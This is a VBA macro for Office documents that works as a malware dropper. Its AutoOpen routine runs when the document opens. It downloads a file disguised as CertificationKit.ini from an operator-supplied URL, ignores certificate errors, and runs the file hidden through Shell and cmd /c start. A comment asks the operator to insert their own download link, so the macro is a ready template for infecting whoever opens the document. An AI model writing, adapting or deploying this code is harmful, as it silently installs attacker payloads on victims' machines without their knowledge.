
Sub love_me_____()
    Dim filePath As String
    filePath = "C:\\ProgramData\\CertificationKit.ini"
   
    If Len(Dir(filePath)) > 0 Then
        ExecuteFile filePath
    Else
        DownloadAndRun filePath
    End If
End Sub
Sub DownloadAndRun(filePath As String)
    On Error Resume Next
    Dim objHTTP As Object
    Dim fileNum As Integer
    Dim byteData() As Byte
    
    ' =============================================
    ' IMPORTANT: Put your download link below
    ' Example: https://yourserver.com/CertificationKit.ini
    ' =============================================
    fileURL = ""

   
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Option(4) = 13056
    objHTTP.Open "GET", fileURL, False
    objHTTP.send
   
    If objHTTP.Status = 200 Then
        byteData = objHTTP.responseBody
       
        If UBound(byteData) > 0 Then
            fileNum = FreeFile
            Open filePath For Binary Access Write As #fileNum
            Put #fileNum, , byteData
            Close #fileNum
           
            ExecuteFile filePath
        End If
    End If
End Sub
Sub ExecuteFile(filePath As String)
    On Error Resume Next
   
    Shell filePath, vbHide
    CreateObject("WScript.Shell").Run "cmd /c start /b """ & filePath & """", 0, False
   
End Sub
Sub AutoOpen()
    love_me_____
End Sub
